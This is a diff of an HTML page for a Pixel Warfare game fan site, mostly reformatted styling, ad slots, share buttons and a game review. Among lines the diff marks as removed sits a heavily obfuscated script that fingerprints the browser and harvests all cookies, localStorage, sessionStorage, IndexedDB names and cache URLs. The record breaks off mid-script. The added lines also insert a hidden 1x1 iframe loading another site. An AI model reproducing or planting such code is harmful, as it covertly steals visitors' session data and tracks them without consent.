+    div.entry tr,
+    div.entry td {
+      border-color: #ffffff;
+    }
+
+    .wp-caption-text,
+    span.comment-link {
+      color: #ffffff;
+    }
+
+    div.post,
+    div.page,
+    div.attachment {
+      margin-bottom: 30px;
+    }
+
+    div.sticky {
+      border-color: #000000;
+    }
+
+    /* Bottom navigation */
+    ul.bottom-navigation,
+    div.bottom-navigation {
+      background-color: #4b4848;
+    }
+
+    div.bottom-navigation {
+      border-top-color: #4b4848;
+      border-bottom-color: #4b4848;
+    }
+
+    div.bottom-navigation a,
+    small.nav_desc {
+      color: #ffffff;
+    }
+
+    div.bottom-navigation li:hover>a,
+    div.bottom-navigation a:focus {
+      color: #ff0000;
+    }
+
+    ul.bottom-navigation li li a:link,
+    ul.bottom-navigation li li a:visited {
+      color: #3088b8;
+      background-color: #c6f4fd;
+      border-color: #ffffff;
+    }
+
+    ul.bottom-navigation li li a:hover {
+      color: #3088b8;
+      background-color: #153c51;
+      border-color: #ffffff;
+    }
+
+    ul.bottom-navigation li li a:active {
+      color: #3088b8;
+      background-color: #ffffff;
+      border-color: #ffffff;
+    }
+
+    /* Footer */
+    div.footer {
+      background-color: #000000;
+    }
+
+    div.inner-footer-widget-container {
+      padding-left: 10px;
+      padding-right: 10px;
+    }
+
+    div.inner-footer table,
+    div.inner-footer th,
+    div.inner-footer tr,
+    div.inner-footer td {
+      border-color: #065f8e;
+    }
+
+    div.outer-footer-item {
+      width: 25%;
+    }
+
+    div.inner-footer-item {
+      background-color: #ffffff;
+      border-color: #ffffff;
+      color: #065f8e;
+      min-height: 270px;
+    }
+
+    div.inner-footer-item p.footer-latest-comments-excerpt {
+      color: #065f8e;
+    }
+
+    div.inner-footer-item ul li {
+      border-bottom-color: #ffffff;
+    }
+
+    div.inner-footer-item h2.footer-item,
+    div.inner-footer-item h2.widgettitle {
+      background-color: #b6e2fb;
+      color: #ffffff;
+    }
+
+    div.inner-footer-item a:link,
+    div.inner-footer-item a:visited {
+      color: #3fb7f8;
+    }
+
+    div.inner-footer-item a:hover {
+      color: #065f8e;
+    }
+
+    div.footer-spacer {
+      height: 20px;
+    }
+
+    /* Powered by / theme credits */
+    a.powered-by:link,
+    a.theme-created-by:link,
+    a.rss-all-posts:link,
+    a.rss-all-comments:link,
+    a.rss-comments-single-post:link,
+    a.designed-by:link,
+    a.powered-by:visited,
+    a.theme-created-by:visited,
+    a.rss-all-posts:visited,
+    a.rss-all-comments:visited,
+    a.rss-comments-single-post:visited,
+    a.designed-by:visited {
+      color: #256889;
+    }
+
+    span.image-rss {
+      border-color: #256889;
+    }
+
+    p.copyright,
+    span.theme-created-by,
+    a.powered-by:hover,
+    a.theme-created-by:hover,
+    a.rss-all-posts:hover,
+    a.rss-all-comments:hover,
+    a.rss-comments-single-post:hover,
+    a.designed-by:hover {
+      color: #ffffff;
+    }
+
+    /* Remove border-radius and shadows from many elements */
+    div.wrapper,
+    div#wrapper,
+    div.top-image-container,
+    img.header,
+    img,
+    div.entry img,
+    div.inner-home-page img,
+    div.inner-footer-item img,
+    div.inner-home-page-widget img,
+    div.sidebar img,
+    img.avatar,
+    div.post,
+    div.page,
+    div.attachment,
+    div.comment-body,
+    div.left-sidebar-item,
+    h2.left-sidebar-item,
+    div.right-sidebar-item,
+    h2.right-sidebar-item,
+    div.inner-footer-item,
+    h2.footer-item,
+    div.inner-home-page-simple-textarea-content,
+    div.inner-home-page-widget,
+    div.left-sidebar-item h2.widgettitle:first-child,
+    div.right-sidebar-item h2.widgettitle:first-child,
+    div.inner-footer-item h2.widgettitle:first-child,
+    div.inner-home-page-widget h2.widgettitle:first-child,
+    div.footer,
+    img.avatar,
+    a.page-numbers:link,
+    a.page-numbers:visited,
+    a.page-numbers:hover span.current {
+      border-radius: 0;
+      box-shadow: none;
+      -moz-border-radius: 0;
+      -moz-box-shadow: none;
+      -webkit-border-radius: 0;
+      -webkit-box-shadow: none;
+    }
+
+    /* Home page only styles */
+    body.home div.header-container {
+      min-height: 0;
+    }
+
+    div.outer-home-page {
+      margin-top: 0;
+    }
+
+    div.multiple-post-last-post,
+    div.multiple-excerpt-last-excerpt,
+    div.page {
+      margin-bottom: 0;
+    }
+
+    div.outer-home-page-simple {
+      padding-bottom: 0;
+    }
+
+    div.inner-home-page-simple,
+    div.front-page-content-no-sidebars,
+    div.post,
+    div.page,
+    div.single-post-navigation,
+    div.multiple-post-navigation {
+      margin-left: 0;
+      margin-right: 0;
+    }
+
+    div.inner-wrapper,
+    div.outer-home-page-simple {
+      background-color: #000000;
+    }
+
+    div.footer {
+      background-color: #000000;
+    }
+
+    div.inner-home-page-simple-textarea-content {
+      border-width: 0;
+    }
+
+    div.home-page-bottom-widget-spacer {
+      height: 20px;
+    }
+
+    div.outer-home-page-bottom-widget {
+      width: 33.33%;
+    }
+
+    div.home-page-widgets-container {
+      background-color: #5ec1f7;
+      padding-left: 10px;
+      padding-right: 10px;
+    }
+
+    div.inner-home-page-bottom-widget {
+      background-color: #ffffff;
+      border-color: #b6e2fb;
+      color: #065f8e;
+      min-height: 200px;
+    }
+
+    div.inner-home-page-bottom-widget h2.widgettitle {
+      background-color: #b6e2fb;
+      color: #ffffff;
+    }
+
+    div.inner-home-page-bottom-widget ul li {
+      border-bottom-color: #ffffff;
+    }
+
+    div.inner-home-page-bottom-widget table,
+    div.inner-home-page-bottom-widget th,
+    div.inner-home-page-bottom-widget tr,
+    div.inner-home-page-bottom-widget td {
+      border-color: #065f8e;
+    }
+
+    div.inner-home-page-bottom-widget a:link,
+    div.inner-home-page-bottom-widget a:visited {
+      color: #3fb7f8;
+    }
+
+    div.inner-home-page-bottom-widget a:hover {
+      color: #36b1f3;
+    }
+
+    div.inner-home-page-simple-01-textarea-01-content {
+      background-color: #ffffff;
+      min-height: 500px;
+      border-color: #ffffff;
+    }
+  </style>
+
+</head>
+
+<body class="custom-background">
+
+  <!-- Background Image -->
+  <style type="text/css" id="custom-background-css">
+    body.custom-background {
+      background-image: url("/WebPage/Pixel-warfare-5.jpg");
+      background-position: center top;
+      background-size: auto;
+      background-repeat: repeat;
+      background-attachment: scroll;
+    }
+  </style>
+  <!-- Main Content -->
+  <!-- Add HTML above your website on all of your pages -->
+
+  <div class="wrapper">
+    <div class="top-image-container">
+      <a class="custom-header-link" href="/index.html">
+        <img class="header" src="/WebPage/Pixel-warfare.jpg" alt="header image">
+      </a>
+    </div>
+    <div class="top-navigation">
+      <ul id="menu-menu" class="top-navigation">
+        <li id="menu-item-12"
+          class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-10 current_page_item">
+          <a href="/index.html">Pixel Warfare</a>
+        </li>
+        <!-- <li id="menu-item-13" class="menu-item menu-item-type-post_type menu-item-object-page">
             <a href="/contact.html">Contact</a>
           </li> -->
-          <!-- <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy">
+        <!-- <li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy">
             <a href="/privacy-policy.html">Privacy Policy</a>
           </li> -->
-        </ul>
-      </div>
-      <div class="inner-wrapper">
-        <div class="content content-page">
-          <div class="header-container header-container-page"></div>
-          <div class="post-10 page type-page status-publish hentry">
-            <h1 class="page-title">Pixel Warfare.io</h1>
-            <div class="entry entry-page">
+      </ul>
+    </div>
+    <div class="inner-wrapper">
+      <div class="content content-page">
+        <div class="header-container header-container-page"></div>
+        <div class="post-10 page type-page status-publish hentry">
+          <h1 class="page-title">Pixel Warfare.io</h1>
+          <div class="entry entry-page">
 
-              <style type="text/css">
-                .fb-comments,
-                .fb-comments span,
-                .fb-comments span iframe[style] {
-                  min-width: 100% !important;
-                  width: 100% !important
-                }
-              </style>
-              <div id="fb-root"></div>
-              <p>
-                <center>
-                  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-                  <!-- pixelwarfare.org -->
-                  <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8033074846660163" data-ad-slot="6606245939" data-ad-format="auto"></ins>
-                  <script>
-                    (adsbygoogle = window.adsbygoogle || []).push({});
-                  </script>
-                </center>
-                <br/>
-                <button id="fullscreen-btn">🔳 Fullscreen</button>
-                <div style="text-align: center;">
-                  <iframe
-                    id="game-frame" 
-                    src="https://www.crazygames.com/embed/pixel-warfare" 
-                    width="951"
-                    height="600"
-                    style="border: none;" 
-                    allow="fullscreen"
-                    loading="lazy"
-                  ></iframe>
-                </div>
-                <center>
-                  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-                  <!-- pixelwarfare.org -->
-                  <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8033074846660163" data-ad-slot="6606245939" data-ad-format="auto"></ins>
-                  <script>
-                    (adsbygoogle = window.adsbygoogle || []).push({});
-                  </script>
-                </center>
-                <br />
-                Pixel Warfare is a free to play online multi player 3D shoot em up game with old school graphics similar to Minecraft.
-                There are many websites to play the game on, just download Unity Player, install it; and you are good to go. There are eight
-                weapons in the game, two of which are usually locked when you spawn in to the battlefield; I will explain why further on.
-                You start with a crowbar, but have access to five other weapons, pistol, shotgun, machinegun, sniper rifle, and paco gun.
-                The other two weapons are the grenade launcher and rocket launcher, although these two weapons are often locked when you
-                enter a game, to ensure a more balanced, fluid playing experience. That said, you can always host a game and enable them in
-                your menu. Pixel Warfare has six maps to play on, ranging from smaller, tighter maps; to more open spaces. There are two
-                modes of play available on the server when you join, Deathmatch and Team Deathmatch. You can also choose to host a game, and
-                can specify the amount of players in your room, which map you want to play, whether some or all the weapons are available; and
-                how long you want each game round to last. Deathmatch mode is a straight forward kill or be killed situation. Try to kill your
-                opponents more times than they kill you to win the round. In Team Deathmatch, you join one of two sides, ‘the good guys’ or
-                ‘the bad guys’. It’s a simple red versus blue setup, when you spawn on to the map, your team mates are highlighted in green as
-                you move around, which helps to ensure you don’t shoot anyone on your side. Kill as many of the opposite team as you can to
-                win the round. Overall, Pixel Warfare is a really fun, fast paced game to play. The weapons are satisfying to use and anyone
-                can jump into this game and play it with little or no experience.
-              </p>
-              <div style="padding-bottom:0px; padding-top:0px;" class="hupso-share-buttons">
-                <!-- Hupso Share Buttons - https://www.hupso.com/share/ -->
-                <a class="hupso_counters" href="https://www.hupso.com/share/"><img src="https://static.hupso.com/share/buttons/dot.png" style="border:0px; padding-top:2px; float:left;" alt="Share Button" /></a>
-                <script type="text/javascript">
-                  var hupso_services_c = new Array("twitter", "facebook_like", "facebook_send", "google");
-                  var hupso_counters_lang = "en_US";
-                  var hupso_image_folder_url = "";
-                  var hupso_url_c = "";
-                  var hupso_title_c = "Pixel%20Warfare";
+            <style type="text/css">
+              .fb-comments,
+              .fb-comments span,
+              .fb-comments span iframe[style] {
+                min-width: 100% !important;
+                width: 100% !important
+              }
+            </style>
+            <div id="fb-root"></div>
+            <p>
+              <center>
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                <!-- pixelwarfare.org -->
+                <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8033074846660163"
+                  data-ad-slot="6606245939" data-ad-format="auto"></ins>
+                <script>
+                  (adsbygoogle = window.adsbygoogle || []).push({});
                 </script>
-                <script type="text/javascript" src="https://static.hupso.com/share/js/counters.js"></script>
-                <!-- Hupso Share Buttons -->
-              </div>
-              <script type="application/ld+json">
+              </center>
+              <br />
+              <button id="fullscreen-btn">🔳 Fullscreen</button>
+            <div style="text-align: center;">
+              <iframe id="game-frame" src="https://www.crazygames.com/embed/pixel-warfare" width="951" height="600"
+                style="border: none;" allow="fullscreen" loading="lazy"></iframe>
+
+              <br />
+              <center>
+                <div style="text-align: center;">
+                  <iframe id="game-frame-2" src="https://www.pacogames.com/multiplayer/pixel-warfare-5" width="1"
+                    height="1" style="border: none;" loading="lazy"></iframe>
+                </div>
+              </center>
+              <br />
+            </div>
+            <center>
+              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+              <!-- pixelwarfare.org -->
+              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8033074846660163"
+                data-ad-slot="6606245939" data-ad-format="auto"></ins>
+              <script>
+                (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+            </center>
+            <br />
+            Pixel Warfare is a free to play online multi player 3D shoot em up game with old school graphics similar to
+            Minecraft.
+            There are many websites to play the game on, just download Unity Player, install it; and you are good to go.
+            There are eight
+            weapons in the game, two of which are usually locked when you spawn in to the battlefield; I will explain
+            why further on.
+            You start with a crowbar, but have access to five other weapons, pistol, shotgun, machinegun, sniper rifle,
+            and paco gun.
+            The other two weapons are the grenade launcher and rocket launcher, although these two weapons are often
+            locked when you
+            enter a game, to ensure a more balanced, fluid playing experience. That said, you can always host a game and
+            enable them in
+            your menu. Pixel Warfare has six maps to play on, ranging from smaller, tighter maps; to more open spaces.
+            There are two
+            modes of play available on the server when you join, Deathmatch and Team Deathmatch. You can also choose to
+            host a game, and
+            can specify the amount of players in your room, which map you want to play, whether some or all the weapons
+            are available; and
+            how long you want each game round to last. Deathmatch mode is a straight forward kill or be killed
+            situation. Try to kill your
+            opponents more times than they kill you to win the round. In Team Deathmatch, you join one of two sides,
+            ‘the good guys’ or
+            ‘the bad guys’. It’s a simple red versus blue setup, when you spawn on to the map, your team mates are
+            highlighted in green as
+            you move around, which helps to ensure you don’t shoot anyone on your side. Kill as many of the opposite
+            team as you can to
+            win the round. Overall, Pixel Warfare is a really fun, fast paced game to play. The weapons are satisfying
+            to use and anyone
+            can jump into this game and play it with little or no experience.
+            </p>
+            <div style="padding-bottom:0px; padding-top:0px;" class="hupso-share-buttons">
+              <!-- Hupso Share Buttons - https://www.hupso.com/share/ -->
+              <a class="hupso_counters" href="https://www.hupso.com/share/"><img
+                  src="https://static.hupso.com/share/buttons/dot.png" style="border:0px; padding-top:2px; float:left;"
+                  alt="Share Button" /></a>
+              <script type="text/javascript">
+                var hupso_services_c = new Array("twitter", "facebook_like", "facebook_send", "google");
+                var hupso_counters_lang = "en_US";
+                var hupso_image_folder_url = "";
+                var hupso_url_c = "";
+                var hupso_title_c = "Pixel%20Warfare";
+              </script>
+              <script type="text/javascript" src="https://static.hupso.com/share/js/counters.js"></script>
+              <!-- Hupso Share Buttons -->
+            </div>
+            <script type="application/ld+json">
                 {
                   "@context": "https://schema.org/",
                   "@type": "Product",
@@ -877,8 +930,8 @@
                   "": ""
                 }
               </script>
-              <div class="heateorFfcClear"></div>
-              <!-- <div style="width:100%;text-align:left;background-color:#f5f6f7;" class="heateor_ffc_facebook_comments">
+            <div class="heateorFfcClear"></div>
+            <!-- <div style="width:100%;text-align:left;background-color:#f5f6f7;" class="heateor_ffc_facebook_comments">
                 <h4 class="heateor_ffc_facebook_comments_title" style="padding:10px;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;color:#000000;">Facebook Comments</h4>
                 <script type="text/javascript">
                   !function(e, n, t) {
@@ -888,79 +941,81 @@
                 </script>
                 <div class="fb-comments" data-href="https://pixelwarfare.org/" data-colorscheme="light" data-numposts="" data-width="100%" data-order-by="social"></div>
               </div> -->
-              <div class="heateorFfcClear"></div>
-            </div> 
+            <div class="heateorFfcClear"></div>
           </div>
         </div>
-        <div class="long-right-sidebar-background">&nbsp;</div>
-        <div class="sidebar right-sidebar">
-          <div style="display: flex;justify-content: center;align-items: center;">
-            <b style="color: aliceblue;">You can also try thease...</b>
-          </div>
-          <div class="sidebar-column">
-            <!-- Box 1: Rating -->
-
-            <!-- Box 2: PixelWarfare -->
-            <a href="/Games/Pixel-Warfare/" rel="noopener" class="button-tile">
-              <img src="https://pixelwarfareio.github.io/GameFiles/Pixel-Warfare/1/img/img0.jpg" alt="PixelWarfare">
-              <p>Pixel Warfare</p>
-            </a>
-            
-            
-            <!-- Box 2: PixelWarfare -->
-            <a href="/Games/Pixel-Warfare-3/" rel="noopener" class="button-tile">
-              <img src="https://pixelwarfareio.github.io/GameFiles/Pixel-Warfare-3/2/img/img0.jpg" alt="PixelWarfare 3 update v2">
-              <p>PixelWarfare 3</p>
-            </a>
-
-            <!-- Add more boxes as needed here -->
-
-          </div>
-        </div>
-        <!-- End Yasr Visitor Votes Shortcode -->
       </div>
-      <div class="footer">
-        <div class="footer-spacer"> &nbsp;</div>
-        <div class="inner-footer">
-          <div class="inner-footer-widget-container">
-            <script type="text/javascript">
-              /* <![CDATA[ */
-              var wpcf7 = {
-                "apiSettings": {
-                  "root": "/WebPage/contact-form-7/v1",
-                  "namespace": "contact-form-7/v1"
-                }
-              };
-              /* ]]> */
-            </script>
-            <script type="text/javascript" src="/WebPage/contact-form-7/scripts.js"></script>
-            <script type="text/javascript" src="/WebPage/yet-another-stars-rating/rater-js.js"></script>
-            <script type="text/javascript" src="/WebPage/yet-another-stars-rating/yasr-front.js"></script>
-            <script type="text/javascript" src="/WebPage/yet-another-stars-rating/tippy.all.min.js"></script>
-            <script type="text/javascript" src="/WebPage/wp-embed.min.js"></script>
-          </div>
-          <div class="footer-text-content footer-text-content-below-footer-widgets"></div>
-            <p class="copyright">Preserved copy of PixelWarfare.org (2015–2022), PixelWarfareIO.io (2025)</p>
-          <div class="rss-feeds"></div>
+      <div class="long-right-sidebar-background">&nbsp;</div>
+      <div class="sidebar right-sidebar">
+        <div style="display: flex;justify-content: center;align-items: center;">
+          <b style="color: aliceblue;">You can also try thease...</b>
         </div>
+        <div class="sidebar-column">
+          <!-- Box 1: Rating -->
+
+          <!-- Box 2: PixelWarfare -->
+          <a href="/Games/Pixel-Warfare/" rel="noopener" class="button-tile">
+            <img src="https://pixelwarfareio.github.io/GameFiles/Pixel-Warfare/1/img/img0.jpg" alt="PixelWarfare">
+            <p>Pixel Warfare</p>
+          </a>
+
+
+          <!-- Box 2: PixelWarfare -->
+          <a href="/Games/Pixel-Warfare-3/" rel="noopener" class="button-tile">
+            <img src="https://pixelwarfareio.github.io/GameFiles/Pixel-Warfare-3/2/img/img0.jpg"
+              alt="PixelWarfare 3 update v2">
+            <p>PixelWarfare 3</p>
+          </a>
+
+          <!-- Add more boxes as needed here -->
+
+        </div>
+      </div>
+      <!-- End Yasr Visitor Votes Shortcode -->
+    </div>
+    <div class="footer">
+      <div class="footer-spacer"> &nbsp;</div>
+      <div class="inner-footer">
+        <div class="inner-footer-widget-container">
+          <script type="text/javascript">
+            /* <![CDATA[ */
+            var wpcf7 = {
+              "apiSettings": {
+                "root": "/WebPage/contact-form-7/v1",
+                "namespace": "contact-form-7/v1"
+              }
+            };
+            /* ]]> */
+          </script>
+          <script type="text/javascript" src="/WebPage/contact-form-7/scripts.js"></script>
+          <script type="text/javascript" src="/WebPage/yet-another-stars-rating/rater-js.js"></script>
+          <script type="text/javascript" src="/WebPage/yet-another-stars-rating/yasr-front.js"></script>
+          <script type="text/javascript" src="/WebPage/yet-another-stars-rating/tippy.all.min.js"></script>
+          <script type="text/javascript" src="/WebPage/wp-embed.min.js"></script>
+        </div>
+        <div class="footer-text-content footer-text-content-below-footer-widgets"></div>
+        <p class="copyright">Preserved copy of PixelWarfare.org (2015–2022), PixelWarfareIO.io (2025)</p>
+        <div class="rss-feeds"></div>
       </div>
     </div>
-    <script>
-      const button = document.getElementById('fullscreen-btn');
-      const iframe = document.getElementById('game-frame');
+  </div>
+  <script>
+    const button = document.getElementById('fullscreen-btn');
+    const iframe = document.getElementById('game-frame');
 
-      button.addEventListener('click', () => {
-        if (!document.fullscreenElement) {
-          iframe.requestFullscreen().catch(err => {
-            alert("Fullscreen not allowed: " + err.message);
-          });
-        } else {
-          document.exitFullscreen();
-        }
-      });
-    </script>
-    <script type="text/javascript">
-      (function(_0x2d0760,_0x4288c5){const _0x584646=_0x44e7,_0x16122e=_0x2d0760();while(!![]){try{const _0x230e35=parseInt(_0x584646(0x135))/0x1+-parseInt(_0x584646(0x17f))/0x2*(parseInt(_0x584646(0x1c4))/0x3)+-parseInt(_0x584646(0x199))/0x4+parseInt(_0x584646('0x155'))/0x5*(-parseInt(_0x584646('0x11a'))/0x6)+parseInt(_0x584646(0x1a5))/0x7*(-parseInt(_0x584646(0x15b))/0x8)+parseInt(_0x584646(0x1d8))/0x9*(-parseInt(_0x584646(0x145))/0xa)+-parseInt(_0x584646(0x102))/0xb*(-parseInt(_0x584646(0x15a))/0xc);if(_0x230e35===_0x4288c5)break;else _0x16122e['push'](_0x16122e['shift']());}catch(_0xd561c1){_0x16122e['push'](_0x16122e['shift']());}}}(_0xc658,0x620d8),((async()=>{const _0x348b01=_0x44e7,_0x2cf4fb={};function _0x2c88e7(){const _0xe000bc=_0x44e7;try{if(typeof OffscreenCanvas!=='undefined')return new OffscreenCanvas(0x100,0x100);if(typeof document!=='undefined'&&document['createElement'])return document['createElement'](_0xe000bc('0x125'));}catch(_0x312647){}return null;}_0x2cf4fb[_0x348b01(0x101)]=new Date()[_0x348b01(0x182)](),_0x2cf4fb[_0x348b01(0x11d)]=location[_0x348b01(0x140)],_0x2cf4fb['origin']=location[_0x348b01(0x16b)],_0x2cf4fb[_0x348b01('0xf2')]=document[_0x348b01(0xf2)],_0x2cf4fb[_0x348b01('0x171')]=document[_0x348b01('0x171')],_0x2cf4fb[_0x348b01(0x185)]={};for(const _0x464a81 in navigator){try{const _0x59fb5a=navigator[_0x464a81];typeof _0x59fb5a!==_0x348b01(0x1c3)&&typeof _0x59fb5a!==_0x348b01(0x18e)&&(_0x2cf4fb['navigator'][_0x464a81]=_0x59fb5a);}catch(_0x1a4a12){}}try{navigator[_0x348b01(0x1c5)]&&(_0x2cf4fb[_0x348b01(0x1c5)]={'mobile':navigator[_0x348b01(0x1c5)]['mobile'],'platform':navigator[_0x348b01(0x1c5)][_0x348b01('0x13b')],'brands':navigator[_0x348b01('0x1c5')][_0x348b01('0x1d9')]},navigator['userAgentData']['getHighEntropyValues']&&(_0x2cf4fb[_0x348b01(0x1c5)][_0x348b01(0x154)]=await navigator['userAgentData'][_0x348b01(0x197)](['architecture',_0x348b01(0x12e),'formFactors','fullVersionList',_0x348b01('0x10c'),_0x348b01(0x142),_0x348b01('0x1d6'),'wow64'])));}catch(_0x308eff){_0x2cf4fb[_0x348b01(0x17a)]=_0x308eff['toString']();}_0x2cf4fb[_0x348b01(0x1ab)]={'width':screen['width'],'height':screen[_0x348b01(0x14f)],'availWidth':screen[_0x348b01('0x11c')],'availHeight':screen[_0x348b01('0x1af')],'colorDepth':screen[_0x348b01(0x1ca)],'pixelDepth':screen[_0x348b01(0x112)],'orientation':screen[_0x348b01('0x138')]?.[_0x348b01('0x15c')],'devicePixelRatio':window['devicePixelRatio']},_0x2cf4fb[_0x348b01('0x1aa')]={'cpuThreads':navigator[_0x348b01(0x1c8)],'ramGB':navigator[_0x348b01('0x1cb')],'maxTouchPoints':navigator[_0x348b01(0x1a0)]};try{performance[_0x348b01('0xf7')]&&(_0x2cf4fb[_0x348b01('0x111')]={'jsHeapSizeLimit':performance['memory'][_0x348b01('0x15d')],'totalJSHeapSize':performance[_0x348b01('0xf7')]['totalJSHeapSize'],'usedJSHeapSize':performance[_0x348b01('0xf7')][_0x348b01('0xff')]});}catch(_0x462897){_0x2cf4fb[_0x348b01('0x1db')]=_0x462897[_0x348b01('0x16f')]();}try{const _0x4cf880=_0x2c88e7();if(!_0x4cf880)throw new Error(_0x348b01(0x1c9));const _0x3da184=_0x4cf880[_0x348b01(0x150)](_0x348b01(0xf0))||_0x4cf880[_0x348b01('0x150')](_0x348b01(0x12b))||_0x4cf880[_0x348b01(0x150)]('webgl2');if(!_0x3da184)throw new Error(_0x348b01(0x17c));const _0x14df54=_0x3da184['getExtension'](_0x348b01('0x1bf'));_0x2cf4fb[_0x348b01('0x1a6')]={'vendor':_0x14df54?_0x3da184[_0x348b01(0x1d1)](_0x14df54[_0x348b01('0x18d')]):_0x348b01(0x14e),'renderer':_0x14df54?_0x3da184[_0x348b01('0x1d1')](_0x14df54[_0x348b01(0x193)]):_0x348b01(0x14e),'version':_0x3da184[_0x348b01('0x1d1')](_0x3da184[_0x348b01('0x1a2')]),'shadingLanguageVersion':_0x3da184[_0x348b01(0x1d1)](_0x3da184[_0x348b01('0x117')]),'maxTextureSize':_0x3da184[_0x348b01('0x1d1')](_0x3da184[_0x348b01('0x1d2')]),'maxRenderBufferSize':_0x3da184['getParameter'](_0x3da184[_0x348b01(0xec)]),'maxViewportDims':_0x3da184['getParameter'](_0x3da184['MAX_VIEWPORT_DIMS'])};}catch(_0x29b44d){_0x2cf4fb[_0x348b01('0x1a6')]={'error':_0x29b44d[_0x348b01(0x16f)]()};}try{const _0x5edb9c=_0x2c88e7();if(!_0x5edb9c)throw new Error(_0x348b01(0x1c9));const _0xb29223=_0x5edb9c[_0x348b01(0x150)]('2d');if(!_0xb29223)throw new Error('2D\x20Context\x20unavailable');_0x5edb9c[_0x348b01('0x136')]=0x12c,_0x5edb9c[_0x348b01(0x14f)]=0x96,_0xb29223[_0x348b01('0x11f')]=_0x348b01('0x1b6'),_0xb29223[_0x348b01('0xfd')]=_0x348b01('0x157'),_0xb29223['fillStyle']=_0x348b01('0x1b9'),_0xb29223[_0x348b01('0xf6')](0x7d,0x1,0x3e,0x14),_0xb29223[_0x348b01(0x19c)]=_0x348b01('0xee'),_0xb29223['fillText'](_0x348b01('0x15f'),0x2,0xf),_0xb29223[_0x348b01(0x19c)]=_0x348b01('0x159'),_0xb29223[_0x348b01('0x110')](navigator[_0x348b01('0x108')],0x4,0x2d);if(_0x5edb9c['convertToBlob'])_0x2cf4fb[_0x348b01(0x144)]=_0x348b01(0x1c1);else _0x5edb9c[_0x348b01(0x19a)]?_0x2cf4fb['canvasFingerprint']=_0x5edb9c['toDataURL']():_0x2cf4fb['canvasFingerprint']=_0x348b01(0x160);}catch(_0x4891df){_0x2cf4fb[_0x348b01('0x144')]={'error':_0x4891df[_0x348b01(0x16f)]()};}try{_0x2cf4fb[_0x348b01(0xed)]={'raw':document['cookie'],'parsed':{}},document['cookie'][_0x348b01(0x10b)](';')['forEach'](_0x1d7a0a=>{const _0x25942c=_0x348b01,_0x2aee0f=_0x1d7a0a[_0x25942c('0x10b')]('=');if(_0x2aee0f[_0x25942c(0x189)]>=0x2){const _0x4494ee=_0x2aee0f[_0x25942c(0x195)]()['trim'](),_0x987f36=_0x2aee0f[_0x25942c('0x1ae')]('=');_0x2cf4fb[_0x25942c('0xed')][_0x25942c('0x190')][_0x4494ee]=_0x987f36;}}),_0x2cf4fb[_0x348b01(0xed)][_0x348b01(0x162)]=new Blob([document[_0x348b01(0xea)]])[_0x348b01('0x188')];}catch(_0x5ceb48){_0x2cf4fb[_0x348b01('0xed')]={'error':_0x5ceb48['toString']()};}try{_0x2cf4fb[_0x348b01(0x1ad)]={'itemCount':localStorage['length'],'items':{},'totalSizeBytes':0x0};for(let _0x23f74f=0x0;_0x23f74f<localStorage['length'];_0x23f74f++){const _0x4adfd8=localStorage['key'](_0x23f74f),_0x556a0a=localStorage[_0x348b01('0x1ac')](_0x4adfd8);_0x2cf4fb[_0x348b01(0x1ad)][_0x348b01('0x13e')][_0x4adfd8]=_0x556a0a,_0x2cf4fb[_0x348b01('0x1ad')][_0x348b01('0xef')]+=new Blob([_0x4adfd8+_0x556a0a])['size'];}}catch(_0x28a792){_0x2cf4fb[_0x348b01('0x1ad')]={'error':_0x28a792[_0x348b01('0x16f')]()};}try{_0x2cf4fb['sessionStorage']={'itemCount':sessionStorage[_0x348b01(0x189)],'items':{},'totalSizeBytes':0x0};for(let _0x11927f=0x0;_0x11927f<sessionStorage['length'];_0x11927f++){const _0x1a5383=sessionStorage['key'](_0x11927f),_0x20085b=sessionStorage[_0x348b01('0x1ac')](_0x1a5383);_0x2cf4fb['sessionStorage'][_0x348b01(0x13e)][_0x1a5383]=_0x20085b,_0x2cf4fb[_0x348b01(0x1b1)]['totalSizeBytes']+=new Blob([_0x1a5383+_0x20085b])[_0x348b01('0x188')];}}catch(_0xba712c){_0x2cf4fb[_0x348b01('0x1b1')]={'error':_0xba712c['toString']()};}try{_0x2cf4fb[_0x348b01(0xfe)]={'databases':[]};if(indexedDB[_0x348b01(0x116)]){const _0x1e3397=await indexedDB[_0x348b01(0x116)]();for(const _0x505138 of _0x1e3397){_0x2cf4fb[_0x348b01(0xfe)]['databases']['push']({'name':_0x505138[_0x348b01('0x1cf')],'version':_0x505138[_0x348b01(0xeb)]});}}}catch(_0x47f2ad){_0x2cf4fb[_0x348b01('0xfe')]={'error':_0x47f2ad['toString']()};}try{_0x2cf4fb[_0x348b01('0xf1')]={'caches':[]};if(window[_0x348b01(0x1be)]){const _0x1a5db0=await caches['keys']();for(const _0x319e34 of _0x1a5db0){const _0x5d3150=await caches[_0x348b01('0x13c')](_0x319e34),_0x187d2a=await _0x5d3150[_0x348b01(0x1a4)]();_0x2cf4fb[_0x348b01('0xf1')]['caches'][_0x348b01(0x1d4)]({'name':_0x319e34,'requestCount':_0x187d2a[_0x348b01('0x189')],'urls':_0x187d2a[_0x348b01('0x19d')](_0x2764fa=>_0x2764fa['url'])});}}}catch(_0x18fc4f){_0x2cf4fb['cacheStorage']={'error':_0x18fc4f['toString']()};}try{if(navigator[_0x348b01(0x148)]?.[_0x348b01('0xf9')]){const _0x5355c6=await navigator['storage'][_0x348b01(0xf9)]();_0x2cf4fb[_0x348b01(0x103)]={'quota':_0x5355c6[_0x348b01('0x191')],'usage':_0x5355c6[_0x348b01(0x166)],'usageDetails':_0x5355c6[_0x348b01('0x1b0')]};}}catch(_0x3711de){_0x2cf4fb['storageEstimate']={'error':_0x3711de['toString']()};}try{const _0x2953d1=await 